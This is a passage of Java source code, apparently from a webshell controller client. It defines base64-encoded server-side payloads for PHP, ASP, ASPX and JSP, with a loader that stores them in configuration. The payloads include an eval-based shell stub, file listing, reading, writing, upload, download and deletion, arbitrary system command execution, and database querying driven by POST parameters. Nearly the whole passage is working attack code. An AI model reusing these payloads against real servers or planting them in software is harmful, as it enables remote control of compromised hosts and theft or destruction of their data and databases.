bnNlLldyaXRlKFJOKTt3aGlsZSghUnMuRU9GICYmICFScy5CT0Ype2ZvcihjPTA7YzxpO2MrKyl7RGF0PVJzLkZpZWxkcyhjKS5WYWx1ZTtSZXNwb25zZS5Xcml0ZShEYXQpO1Jlc3BvbnNlLldyaXRlKENPKTt9UmVzcG9uc2UuV3JpdGUoUk4pO1JzLk1vdmVOZXh0KCk7fUNvbm4uQ2xvc2UoKTt9Y2F0Y2goRXhjZXB0aW9uKXtDb25uLkNsb3NlKCk7fX0=\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
		config.setValue("ASPX_DB_MYSQL", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"dmFyIENvbm49bmV3IEFjdGl2ZVhPYmplY3QoIkFkb2RiLmNvbm5lY3Rpb24iKTt2YXIgc3RyU1FMOlN0cmluZz1TeXN0ZW0uVGV4dC5FbmNvZGluZy5HZXRFbmNvZGluZyg2NTAwMSkuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MiJdKSk7Q29ubi5Db25uZWN0aW9uU3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTtDb25uLkNvbm5lY3Rpb25UaW1lb3V0PTEwO0Nvbm4uT3BlbigpO2lmKHN0clNRTD09IiIpe3ZhciBScz1Db25uLk9wZW5TY2hlbWEoMjApO3ZhciB4OlN0cmluZz0iIjt3aGlsZSghUnMuRU9GICYmICFScy5CT0Ype2lmKFJzLkZpZWxkcygzKS5WYWx1ZT09IlRBQkxFIil7eCs9UnMuRmllbGRzKDIpLlZhbHVlKyJcdHxcdFxyXG4iO31Scy5Nb3ZlTmV4dCgpO31Scy5DbG9zZSgpO0Nvbm4uQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZSh4KTt9ZWxzZXt2YXIgQ086U3RyaW5nPSJcdHxcdCIsUk46U3RyaW5nPSJcclxuIixEYXQ6U3RyaW5nO3ZhciBScz1Db25uLkV4ZWN1dGUoc3RyU1FMKTt2YXIgaTpJbnQzMj1Scy5GaWVsZHMuQ291bnQsYzpJbnQzMjtmb3IoYz0wO2M8aTtjKyspe1Jlc3BvbnNlLldyaXRlKFJzLkZpZWxkcyhjKS5OYW1lK0NPKTt9UmVzcG9uc2UuV3JpdGUoUk4pO3doaWxlKCFScy5FT0YgJiYgIVJzLkJPRil7Zm9yKGM9MDtjPGk7YysrKXtEYXQ9UnMuRmllbGRzKGMpLlZhbHVlO1Jlc3BvbnNlLldyaXRlKERhdCk7UmVzcG9uc2UuV3JpdGUoQ08pO31SZXNwb25zZS5Xcml0ZShSTik7UnMuTW92ZU5leHQoKTt9Q29ubi5DbG9zZSgpO30%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
		
		
		config.setValue("PHP_BASE64", "1");
		config.setValue("PHP_MAKE", "@eval\u0001(base64_decode($_POST[action]));");
		config.setValue("PHP_INDEX", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D");
		config.setValue("PHP_READDICT", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7");
		config.setValue("PHP_READFILE", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D");
		config.setValue("PHP_SAVEFILE", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztlY2hvIEBmd3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pLCJ3IiksYmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pKT8iMSI6IjAiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D");
		config.setValue("PHP_DELETE", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztmdW5jdGlvbiBkZigkcCl7JG09QGRpcigkcCk7d2hpbGUoQCRmPSRtLT5yZWFkKCkpeyRwZj0kcC4iLyIuJGY7aWYoKGlzX2RpcigkcGYpKSYmKCRmIT0iLiIpJiYoJGYhPSIuLiIpKXtAY2htb2QoJHBmLDA3NzcpO2RmKCRwZik7fWlmKGlzX2ZpbGUoJHBmKSl7QGNobW9kKCRwZiwwNzc3KTtAdW5saW5rKCRwZik7fX0kbS0%2BY2xvc2UoKTtAY2htb2QoJHAsMDc3Nyk7cmV0dXJuIEBybWRpcigkcCk7fSRGPWdldF9tYWdpY19xdW90ZXNfZ3BjKCk/YmFzZTY0X2RlY29kZShzdHJpcHNsYXNoZXMoJF9QT1NUWyJ6MSJdKSk6YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pO2lmKGlzX2RpcigkRikpZWNobyhkZigkRikpO2Vsc2V7ZWNobyhmaWxlX2V4aXN0cygkRik/QHVubGluaygkRik/IjEiOiIwIjoiMCIpO307ZWNobygifDwtIik7ZGllKCk7");
		config.setValue("PHP_RENAME", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRzcmM9bT9iYXNlNjRfZGVjb2RlKHN0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pKTpiYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGRzdD1tP2Jhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSkpOmJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MiJdKTtlY2hvKHJlbmFtZSgkc3JjLCRkc3QpPyIxIjoiMCIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D");
		config.setValue("PHP_NEWDICT", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRmPSRtP2Jhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSkpOmJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTtlY2hvKG1rZGlyKCRmKT8iMSI6IjAiKTs7ZWNobygifDwtIik7ZGllKCk7");
		config.setValue("PHP_UPLOAD", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik%2FIjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D");
		config.setValue("PHP_DOWNLOAD", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP2Jhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSkpOmJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7");
		config.setValue("PHP_SHELL", "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D");
		config.setValue("PHP_DB_MYSQL", "@ini_set ( \"display_errors\", \"0\" );@set_time_limit ( 0 );@set_magic_quotes_runtime ( 0 );echo (\"->|\");;$m = get_magic_quotes_gpc ();$conf = $m ? stripslashes ( $_POST [\"z1\"] ) : $_POST [\"z1\"];$ar = explode(\"choraheiheihei\", $conf);$dbn = $m ? stripslashes ( $_POST [\"z2\"] ) : $_POST [\"z2\"];$sql = base64_decode ( $_POST [\"z3\"] );$T = @mysql_connect($ar[0],$ar[1],$ar[2]);@mysql_query ( \"SET NAMES utf8\" );if($dbn==\"\"){$sql = \"SHOW DATABASES\";}else{	@mysql_select_db ( $dbn );}$q = @mysql_query ( $sql );$i = 0;while ( $col = @mysql_field_name ( $q, $i ) ) {echo ($col . \"\\t|\\t\");$i ++;}echo (\"\\r\\n\");while ( $rs = @mysql_fetch_row ( $q ) ) {for($c = 0; $c < $i; $c ++) {echo (trim ( $rs [$c] ));echo (\"\\t|\\t\");}echo (\"\\r\\n\");}@mysql_close ( $T );;echo (\"|<-\");die ();");
		
		
		
		config.setValue("JSP_MAKE", "1");
		config.setValue("JSP_INDEX", "A");
		config.setValue("JSP_READDICT", "B");
		config.setValue("JSP_READFILE", "C");
		config.setValue("JSP_SAVEFILE", "D");
		config.setValue("JSP_DELETE", "E");
		config.setValue("JSP_RENAME", "I");
		config.setValue("JSP_NEWDICT", "J");
		config.setValue("JSP_UPLOAD", "G");
		config.setValue("JSP_DOWNLOAD", "F");
		config.setValue("JSP_SHELL", "M");
		config.setValue("JSP_DB_MYSQL", "com.mysql.jdbc.Driverchoraheiheiheijdbc%3Amysql%3A%2F%2Flocalhost%2Ftestdb%3Fuser%3Dusername%26password%3Duserpwd");
		config.setValue("JSP_DB_MSSQL", "com.microsoft.sqlserver.jdbc.SQLServerDriverchoraheiheiheijdbc%3Asqlserver%3A%2F%2Flocalhost%3BdatabaseName%3Dtestdb%3Buser%3Dusername%3Bpassword%3Duserpwd");
		config.setValue("JSP_DB_ORACLE", "oracle.jdbc.driver.OracleDriverchoraheiheiheijdbc%3aoracle%3athin%3a%40localhostchoraheiheiheiusernamechoraheiheiheiuserpwdchoraheiheiheitestdb");
		
		
		config.setValue("CUS_MAKE", "1");
		config.setValue("CUS_INDEX", "index");
		config.setValue("CUS_READDICT", "readdict");
		config.setValue("CUS_READFILE", "readfile");
		config.setValue("CUS_SAVEFILE", "savefile");
		config.setValue("CUS_DELETE", "delete");
		config.setValue("CUS_RENAME", "rename");
		config.setValue("CUS_NEWDICT", "newdict");
		config.setValue("CUS_UPLOAD", "upload");
		config.setValue("CUS_DOWNLOAD", "download");
		config.setValue("CUS_SHELL", "shell");
	}

	private void LoadParams() {
		Configuration config = new Configuration();
		Safe.SPL = config.getValue("SPL");
		Safe.SPR = config.getValue("SPR");
		Safe.CODE = config.getValue("CODE");
		Safe.ACTION = config.getValue("ACTION");
		Safe.PARAM1 = config.getValue("PARAM1");
		Safe.PARAM2 = config.getValue("PARAM2");

		Safe.PHP_BASE64 = config.getValue("PHP_BASE64");
		Safe.PHP_MAKE = config.getValue("PHP_MAKE");
		Safe.PHP_INDEX = config.getValue("PHP_INDEX");
		Safe.PHP_READDICT = config.getValue("PHP_READDICT");
		Safe.PHP_READFILE = config.getValue("PHP_READFILE");
		Safe.PHP_SAVEFILE = config.getValue("PHP_SAVEFILE");
		Safe.PHP_DELETE = config.getValue("PHP_DELETE");
		Safe.PHP_RENAME = config.getValue("PHP_RENAME");
		Safe.PHP_NEWDICT = config.getValue("PHP_NEWDICT");
		Safe.PHP_UPLOAD = config.getValue("PHP_UPLOAD");
		Safe.PHP_DOWNLOAD = config.getValue("PHP_DOWNLOAD");
		Safe.PHP_SHELL = config.getValue("PHP_SHELL");
		//sjs add
		Safe.PHP_DB_MYSQL = config.getValue("PHP_DB_MYSQL");
		
		
		Safe.JSP_BASE64 = config.getValue("JSP_BASE64");
		Safe.JSP_MAKE = config.getValue("JSP_MAKE");
		Safe.JSP_INDEX = config.getValue("JSP_INDEX");
		Safe.JSP_READDICT = config.getValue("JSP_READDICT");
		Safe.JSP_READFILE = config.getValue("JSP_READFILE");
		Safe.JSP_SAVEFILE = config.getValue("JSP_SAVEFILE");
		Safe.JSP_DELETE = config.getValue("JSP_DELETE");
		Safe.JSP_RENAME = config.getValue("JSP_RENAME");
		Safe.JSP_NEWDICT = config.getValue("JSP_NEWDICT");
		Safe.JSP_UPLOAD = config.getValue("JSP_UPLOAD");
		Safe.JSP_DOWNLOAD = config.getValue("JSP_DOWNLOAD");
		Safe.JSP_SHELL = config.getValue("JSP_SHELL");
		//SJS DB
		Safe.JSP_DB_MYSQL = config.getValue("JSP_DB_MYSQL");
		Safe.JSP_DB_MSSQL = config.getValue("JSP_DB_MSSQL");
		Safe.JSP_DB_ORACLE = config.getValue("JSP_DB_ORACLE");
		// Safe.ASP_MAKE = config.getValue("ASP_MAKE");
		// Safe.ASP_INDEX = config.getValue("ASP_INDEX");
		// Safe.ASP_PAYLOAD = config.getValue("ASP_PAYLOAD");
		Safe.ASP_BASE64 = config.getValue("ASP_BASE64");
		Safe.ASP_MAKE = config.getValue("ASP_MAKE");
		Safe.ASP_INDEX = config.getValue("ASP_INDEX");
		Safe.ASP_READDICT = config.getValue("ASP_READDICT");
		Safe.ASP_READFILE = config.getValue("ASP_READFILE");
		Safe.ASP_SAVEFILE = config.getValue("ASP_SAVEFILE");
		Safe.ASP_DELETE = config.getValue("ASP_DELETE");
		Safe.ASP_RENAME = config.getValue("ASP_RENAME");
		Safe.ASP_NEWDICT = config.getValue("ASP_NEWDICT");
		Safe.ASP_UPLOAD = config.getValue("ASP_UPLOAD");
		Safe.ASP_DOWNLOAD = config.getValue("ASP_DOWNLOAD");
		Safe.ASP_SHELL = config.getValue("ASP_SHELL");
		//asp_mdb_test
		Safe.ASP_DB_MDB = config.getValue("ASP_DB_MDB");
		Safe.ASP_DB_MSSQL = config.getValue("ASP_DB_MSSQL");
		Safe.ASP_DB_MYSQL = config.getValue("ASP_DB_MYSQL");

		
		
		Safe.ASPX_BASE64 = config.getValue("ASPX_BASE64");
		Safe.ASPX_MAKE = config.getValue("ASPX_MAKE");
		Safe.ASPX_INDEX = config.getValue("ASPX_INDEX");
		Safe.ASPX_READDICT = config.getValue("ASPX_READDICT");
		Safe.ASPX_READFILE = config.getValue("ASPX_READFILE");
		Safe.ASPX_SAVEFILE = config.getValue("ASPX_SAVEFILE");
		Safe.ASPX_DELETE = config.getValue("ASPX_DELETE");
		Safe.ASPX_RENAME = config.getValue("ASPX_RENAME");
		Safe.ASPX_NEWDICT = config.getValue("ASPX_NEWDICT");
		Safe.ASPX_UPLOAD = config.getValue("ASPX_UPLOAD");
		Safe.ASPX_DOWNLOAD = config.getValue("ASPX_DOWNLOAD");
		Safe.ASPX_SHELL = config.getValue("ASPX_SHELL");
		//sjs db
		Safe.ASPX_DB_MSSQL = config.getValue("ASPX_DB_MSSQL");
		Safe.ASPX_DB_MYSQL = config.getValue("ASPX_DB_MYSQL");
		Safe.ASPX_DB_MDB = config.getValue("ASPX_DB_MDB");
		
		Safe.CUS_BASE64 = config.getValue("CUS_BASE64");
		Safe.CUS_MAKE = config.getValue("CUS_MAKE");
		Safe.CUS_INDEX = config.getValue("CUS_INDEX");
		Safe.CUS_READDICT = config.getValue("CUS_READDICT");
		Safe.CUS_READFILE = config.getValue("CUS_READFILE");
		Safe.CUS_SAVEFILE = config.getValue("CUS_SAVEFILE");
		Safe.CUS_DELETE = config.getValue("CUS_DELETE");
		Safe.CUS_RENAME = config.getValue("CUS_RENAME");
		Safe.CUS_NEWDICT = config.getValue("CUS_NEWDICT");
		Safe.CUS_UPLOAD = config.getValue("CUS_UPLOAD");
		Safe.CUS_DOWNLOAD = config.getValue("CUS_DOWNLOAD");
		Safe.CUS_SHELL = config.getValue("CUS_SHELL");
	}
}
